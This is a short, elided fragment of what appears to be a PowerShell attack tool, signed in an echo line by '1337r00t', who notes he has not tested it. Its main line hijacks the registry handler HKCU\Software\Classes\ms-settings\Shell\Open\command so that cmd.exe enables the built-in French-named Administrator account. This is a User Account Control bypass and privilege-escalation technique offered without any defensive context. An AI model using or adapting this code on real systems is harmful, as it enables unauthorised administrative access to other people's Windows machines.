...
function main
{
	...
	Invoke-Expression -Command 'echo Coded By 1337r00t Sorry i Am not testing this tool'
		...
		Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'C:\Windows\System32\cmd.exe /k net user Administrateur /active:yes' -Force
